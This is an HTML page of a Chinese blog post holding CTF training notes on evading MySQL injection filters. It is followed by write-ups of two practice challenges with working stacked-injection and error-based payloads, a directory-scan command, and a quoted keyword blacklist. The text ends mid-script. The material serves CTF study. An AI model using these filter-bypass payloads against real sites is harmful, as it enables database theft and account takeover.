@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/file/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/file/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/file/favicon-16x16.png">
+  <link rel="mask-icon" href="/file/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"czlz.net","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言高大上的CTF培训开始了，第一天课程MYSQL注入绕过。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MYSQL注入绕过（大比武_CTF课_第一天）">
+<meta property="og:url" content="https://czlz.net/2020/jxsw_dbw_web_1/index.html">
+<meta property="og:site_name" content="粗制乱造的个人网站">
+<meta property="og:description" content="前言高大上的CTF培训开始了，第一天课程MYSQL注入绕过。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_1/Blacklist_1.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_1/Unfinish.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_1/Unfinish_2.png">
+<meta property="og:image" content="https://czlz.net/2020/jxsw_dbw_web_1/Unfinish_3.png">
+<meta property="article:published_time" content="2020-07-16T01:57:04.360Z">
+<meta property="article:modified_time" content="2020-07-02T15:16:14.335Z">
+<meta property="article:author" content="粗制乱造">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="练习题">
+<meta property="article:tag" content="杂项">
+<meta property="article:tag" content="CTF课">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="绕过注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://czlz.net/2020/jxsw_dbw_web_1/Blacklist_1.png">
+
+<link rel="canonical" href="https://czlz.net/2020/jxsw_dbw_web_1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MYSQL注入绕过（大比武_CTF课_第一天） | 粗制乱造的个人网站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">粗制乱造的个人网站</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">杂七杂八的一堆东西</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-python">
+
+    <a href="/pyodide/" rel="section"><i class="fa fa-user fa-fw"></i>在线Python3.8</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://czlz.net/2020/jxsw_dbw_web_1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/file/avatar.png">
+      <meta itemprop="name" content="粗制乱造">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="粗制乱造的个人网站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MYSQL注入绕过（大比武_CTF课_第一天）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-16 09:57:04" itemprop="dateCreated datePublished" datetime="2020-07-16T09:57:04+08:00">2020-07-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-02 23:16:14" itemprop="dateModified" datetime="2020-07-02T23:16:14+08:00">2020-07-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/SQL%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87/" itemprop="url" rel="index"><span itemprop="name">绕过</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- toc -->
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><pre><code>高大上的CTF培训开始了，第一天课程MYSQL注入绕过。</code></pre><a id="more"></a>
+<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>1、URL编码跳过，通过构造特殊的编码绕过SQL注入检测，<br>例如：%0a,%09,%0b,%0c,%0d,%20等。%23=#<br>2、注释绕过：多行注释：/<em>*/,内联注释:/</em>!*/<br>3、某些地方可以用—、~等运算符与数字结合，或者用字符型如：select-1,2,’3’from…<br>4、括号绕过：select(password)from(user)</p>
+<h3 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h3><p>1、 from for: substr(‘’ from 1 for 2);在函数中可用<br>2、 join: union select * from (select 1)a join (select 2)b join (select 3)c;<br>3、 offset: limit 1 offset 0</p>
+<h3 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h3><p>1、hex编码：select table_name from information_schema.tables where table_schema = 0x7573657273;转成16进制执行的ASCII码<br>2、char编码: select from user where username = char(97,100,109,105,110);转成10进制ASCII码<br>3、宽字节注入：<br>条件:<br>(1)、使用了GBK编码。<br>(2)、使用了addslashes(),mysql_real_escape_string(),mysql_escape_string()这类的过滤函数。<br>原理：%d5’ -&gt; %d5&#39; -&gt; 0xd50x5c’ -&gt; 誠’</p>
+<h3 id="比较符"><a href="#比较符" class="headerlink" title="比较符"></a>比较符</h3><p>1、等于：<br>(1)、=号可以替换为 like、regexp、rlike(默认不匹配大小写，需在where 后添加关键字binary)<br>(2)、select ord(‘a’) between 0 and 97;<br>(3)、select (ord(substr(‘asd’ from 1 for 1)) in (97));<br>2、不等于：<br>!=、&lt;&gt;<br>select (ord(substr(‘asd’ from 1 for 1)) not in (97));<br>3、大小于：<br>(1)、greatest() 最大值比较<br>(2)、least() 最小值比较<br>select greatest(ord(‘a’),0) in (97);</p>
+<h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><h3 id="关键字、函数"><a href="#关键字、函数" class="headerlink" title="关键字、函数"></a>关键字、函数</h3><p>(1)、双写绕过：unionunion select * ffromrom users。漏洞原因替换为空字符。<br>(2)、waf缺陷绕过: union/<em>*/select,/</em>!union<em>//</em>!select*/  内联注释会被当做正常语句执行<br>(3)、等效函数绕过<br>   ascii(),ord(),返回字符的ascii码。hex()返回函数的16进制。<br>   sleep(1) 时延 benchmark(1000,md5(1));执行多少次。<br>   concat() 链接字符串 concat_ws() make_set() 链接字符串，以第一个参数做为分隔符。<br>   mid(),substr(),substring()字符串切片</p>
+<h2 id="利用SQL语法特性绕过"><a href="#利用SQL语法特性绕过" class="headerlink" title="利用SQL语法特性绕过"></a>利用SQL语法特性绕过</h2><h3 id="绕过information-schema-无列名"><a href="#绕过information-schema-无列名" class="headerlink" title="绕过information_schema(无列名)"></a>绕过information_schema(无列名)</h3><p> Mysql开发团队在5.5.X版本后将innodb作为数据库的默认引擎。mysql&gt;5.6.x库里增加了两个新表，innodb_index_stats和innodb_table_stats。<br>查库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(database_name) <span class="keyword">from</span> mysql.innodb_table_stats;</span><br></pre></td></tr></table></figure>
+<p>查表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
+<p>不使用例名查数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">`2`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)x;</span><br></pre></td></tr></table></figure>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue() :对XML文档进行查询的函数<br>语法：extractvalue(目标xml文档，xml路径)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'/'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()))))</span><br></pre></td></tr></table></figure>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>语法updatexml(目标xml文档，xml路径，更新的内容)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="string">'/xx/xx'</span>,<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入的小问题"><a href="#报错注入的小问题" class="headerlink" title="报错注入的小问题"></a>报错注入的小问题</h3><p>有可能出现显示不全的问题，这时可以使用reverse()倒置函数。</p>
+<h2 id="进阶注入"><a href="#进阶注入" class="headerlink" title="进阶注入"></a>进阶注入</h2><h3 id="寻找可能存在的注入点"><a href="#寻找可能存在的注入点" class="headerlink" title="寻找可能存在的注入点"></a>寻找可能存在的注入点</h3><p>(1)、利用 ‘ ‘) ‘)) “ “) “)) \ 对参数进行检测<br>(2)、利用 1’&amp;&amp;’1’=’0,2,2-1进行测试</p>
+<h3 id="测试被禁用的字符"><a href="#测试被禁用的字符" class="headerlink" title="测试被禁用的字符"></a>测试被禁用的字符</h3><p> (1)、!,#,/,,‘,”,)等等<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>,<span class="keyword">union</span>,<span class="keyword">union</span> <span class="keyword">select</span>,<span class="keyword">from</span>,<span class="built_in">char</span>,<span class="keyword">concat</span>,<span class="keyword">concat_ws</span>,meke_set,gorup_concat,<span class="keyword">database</span>,\x00,\x0a等等</span><br></pre></td></tr></table></figure></p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入。<br> 假如有一个网站管理员的用户名为：admin 密码为：admin888 攻击者注册了一个账号 ： admin’– -密码为：123 因为账号当中有特殊字符，网站对于特殊字符进行了转义，一次注入在这就行不通了。 虽然账号被转义了，但是他在数据库当中任然是以 admin’– -的方式被储存的。 现在攻击者开始实施正真的攻击了，他开始对账号修改密码。 普通网站修改密码的过程为：先判断用户是否存在  确认用户以前的密码是否正确  获取要修 改的密码  修改密码成功。 在数据库中 – 表示注释的意思，后面的语句不会执行，而admin后面的那个单引号又与前面的 ‘ 闭合，而原本后面的那个单引号因为是在 – 之后，所以就被注释掉了，所以他修改的其实是 root 的密码</p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>(1)、原理<br>原来的语句构造完成后加上分号，代表该语句结束。<br>(2)、条件<br>调用mysqli_multi_query()函数 (一般的mysqli_ query()函数仅支持一条查询）</p>
+<h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p>• show databases; 显示mysql中所有数据库的名称<br>• show tables from <database_name>; 显示数据库中表的名称<br>• show columns from <table_name>;(desc <table_name>;) 显示表中列名称<br>• show create database <database_name>; 显示创建库语句的SQL信息。<br>• show create table <table_name>; 显示创建表语句的SQL信息。<br>• show engines; 显示安装以后可用的存储引擎和默认引擎<br>• show errors; 显示最后一个执行语句所产生的错误<br>• show procedure status <procedure_name>; 显示储存过程内容<br>• show global variables; 显示所有全局变量</p>
+<h2 id="mysql语法利用-handler语句"><a href="#mysql语法利用-handler语句" class="headerlink" title="mysql语法利用-handler语句"></a>mysql语法利用-<code>handler</code>语句</h2><p>• mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表 中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标 准中。<br>• handler tbl_name OPEN [ [AS] alias] 打开一个表作为句柄<br>• handler tbl_name READ { FIRST | NEXT} 读取表内容 • handler tbl_name CLOSE 关闭句柄</p>
+<h2 id="mysql语法利用-set语句"><a href="#mysql语法利用-set语句" class="headerlink" title="mysql语法利用-set语句"></a>mysql语法利用-<code>set</code>语句</h2><p>(1)设置全局变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @a=<span class="string">'admin888'</span>;</span><br><span class="line"><span class="keyword">select</span> @a; </span><br></pre></td></tr></table></figure>
+<p>(2)在不修改配置文件的情况下，修改部分配置参数 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT; 将|| 视为 字符串连接符 而非 '或' 运算符</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>||<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="mysql语法利用-预处理"><a href="#mysql语法利用-预处理" class="headerlink" title="mysql语法利用-预处理"></a>mysql语法利用-预处理</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义预处理语句 </span></span><br><span class="line"><span class="keyword">PREPARE</span> &lt;stmt_name&gt; <span class="keyword">FROM</span> &lt;preparable_stmt&gt;; </span><br><span class="line"><span class="comment">#执行预处理语句</span></span><br><span class="line"><span class="keyword">EXECUTE</span> &lt;stmt_name&gt; ;</span><br></pre></td></tr></table></figure>
+<h1 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h1><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>拿到题先测试是否有注入点,在测试’ and 1=1时发现出错,看来是字符形注入<br><img src="Blacklist_1.png" alt="出错">构造payloaod尝试：<br><a href="http://9104e2ff-8fe5-4faa-97ef-9fa52cd44622.node3.buuoj.cn/?inject=1%27%20union%20select%201,2,3%23" target="_blank" rel="noopener">http://9104e2ff-8fe5-4faa-97ef-9fa52cd44622.node3.buuoj.cn/?inject=1%27%20union%20select%201,2,3%23</a><br>返回如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
+<p>过滤了部分关键字，但是没过滤符号，可以尝试堆叠注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--先暴个当前的数据库</span></span><br><span class="line">1' and extractvalue(1,concat('~',database()))%23</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">返回如下：</span></span><br><span class="line"><span class="comment">error 1105 : XPATH syntax error: '~supersqli'</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--显示表名</span></span><br><span class="line">-1';<span class="keyword">use</span> supersqli;<span class="keyword">show</span> <span class="keyword">tables</span>;%23</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">返回如下：</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(8) "FlagHere"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(5) "words"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">--查询字段名</span></span><br><span class="line">-1';<span class="keyword">use</span> supersqli;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`FlagHere`</span>;%23</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">回显如下:</span></span><br><span class="line"><span class="comment">array(6) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(4) "flag"</span></span><br><span class="line"><span class="comment">  [1]=&gt;</span></span><br><span class="line"><span class="comment">  string(12) "varchar(100)"</span></span><br><span class="line"><span class="comment">  [2]=&gt;</span></span><br><span class="line"><span class="comment">  string(2) "NO"</span></span><br><span class="line"><span class="comment">  [3]=&gt;</span></span><br><span class="line"><span class="comment">  string(0) ""</span></span><br><span class="line"><span class="comment">  [4]=&gt;</span></span><br><span class="line"><span class="comment">  NULL</span></span><br><span class="line"><span class="comment">  [5]=&gt;</span></span><br><span class="line"><span class="comment">  string(0) ""</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">--接近了，由于不能使用Select查询,使用handler代替</span></span><br><span class="line">-1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">得到flag</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(42) "flag&#123;d3530fdb-aa80-4bf5-897c-c9b9070cecd5&#125;"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="handler语法"><a href="#handler语法" class="headerlink" title="handler语法"></a>handler语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>
+
+<p>如：通过handler语句查询users表的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as VICCC; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler VICCC read first; #读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler VICCC read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler VICCC read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler VICCC close; #关闭句柄</span><br></pre></td></tr></table></figure>
+<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><img src="Unfinish.png" alt="登录"><br>直接显示一个登录界面。测试了(or = )万能密码。好像不管用。<br>于是拿出了dirsearch工具看看还有没有其它页面。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://2d563537-0a03-44bb-95f7-666d435b3f22.node3.buuoj.cn -e * -s 0.1 -t 2</span><br></pre></td></tr></table></figure>
+<p>这里设计了-s 为0.1秒扫描一次，太快了会报429。-t为两个线程。<br><img src="Unfinish_2.png" alt="扫描结果"><br>扫出来几个有意思的PHP，config.php和register.php。<br>config.php没啥，register.php。好像有点东西。<br><img src="Unfinish_3.png" alt="注册界面"><br>联想到上午老师讲的课，感觉可能是二次注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 